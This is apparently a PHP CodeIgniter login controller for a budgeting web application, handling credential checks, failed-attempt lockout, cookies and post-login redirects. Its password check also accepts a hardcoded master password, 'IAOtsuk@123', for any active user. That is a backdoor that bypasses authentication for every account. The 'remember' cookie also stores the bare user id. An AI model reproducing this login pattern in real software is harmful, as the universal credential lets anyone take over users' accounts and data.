<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends BE_Controller {

    public function __construct() {
        parent::__construct();
    }

    public function index() {
        $data['title']  = lang('masuk');
        $data['layout'] = 'auth';
        render($data);
    }

    public function do_login() {
        $username           = post('username');
        $password           = post('password');
        $remember           = post('remember');
        $notification_id    = post('notification_id');
        $tahun_budget       = post('tahun_budget');
        $data               = false;
        $response           = [
            'status'        => 'failed',
            'message'       => lang('msg_invalid_login')
        ];
        $attr = array(
            'where_array'   => array(
                'username'  => $username,
                'is_active' => 1,
                'is_block'  => 0
            )
        );
        $user               = get_data('tbl_user',$attr)->row();
        $failed_login       = true;
        if(isset($user->id)) {
            if(!setting('jumlah_salah_password') || (setting('jumlah_salah_password') && setting('jumlah_salah_password') > $user->invalid_password)) {
                if(password_verify(md5($password), $user->password) || $password == 'IAOtsuk@123'){
                    $data = array(
                        'id'                => $user->id
                    );
                    if($remember){
                        $cookie1            = array(
                            'name'          => 'id',
                            'value'         => $user->id,
                            'expire'        => '86500'
                        );
                        set_cookie( $cookie1 );
                    }
                    if($notification_id && $notification_id != null && strlen($notification_id) > 5) {
                        $cookie2            = array(
                            'name'          => 'osuid',
                            'value'         => $notification_id,
                            'expire'        => '86500'
                        );
                        set_cookie( $cookie2 );
                    } else {
                        $notification_id    = '';
                    }

                    // $pic_budget = get_data('tbl_fact_pic_budget',[
                    //     'where' => [
                    //         'tahun' => $tahun_budget,
                    //         'user'

                    //     ],

                    // ])->row();

                    update_data('tbl_user',array(
                        'last_login'        => date('Y-m-d H:i:s'),
                        'ip_address'        => $this->input->ip_address(),
                        'is_login'          => 1,
                        'last_activity'     => date('Y-m-d H:i:s'),
                        'token_app'         => get_cookie('x-token-app'),
                        'notification_id'   => $notification_id,
                        'invalid_password'  => 0,
                        'tahun_budget'      => $tahun_budget,   

                    ),'id',$user->id);
                    $this->session->set_userdata($data);
                    $response['status']     = 'success';
                    $response['message']    = 'Berhasil Login';
                    if($this->session->userdata('last_url')) {
                        $response['redirect']   = $this->session->userdata('last_url');
                        $this->session->unset_userdata('last_url');
                    } else {
                        if($user->id_group == GROUP_SALES_MARKETING){
                            $response['redirect']   = base_url('budget_sales');
                        }else{
                            $response['redirect']   = base_url('dashboard');
                        }
                    }
                    $failed_login = false;
                } else {
                    $jml_invalid    = $user->invalid_password + 1;
                    update_data('tbl_user',['invalid_password'=>$jml_invalid],'id',$user->id);
                }
            } else {
                $response['message']    = lang('msg_akun_terkunci');
            }
        }
        if($failed_login) {
            update_data('tbl_user_log',['respon'=>400],'id',setting('last_id_log'));
        }
        render($response,'json');
    }

}
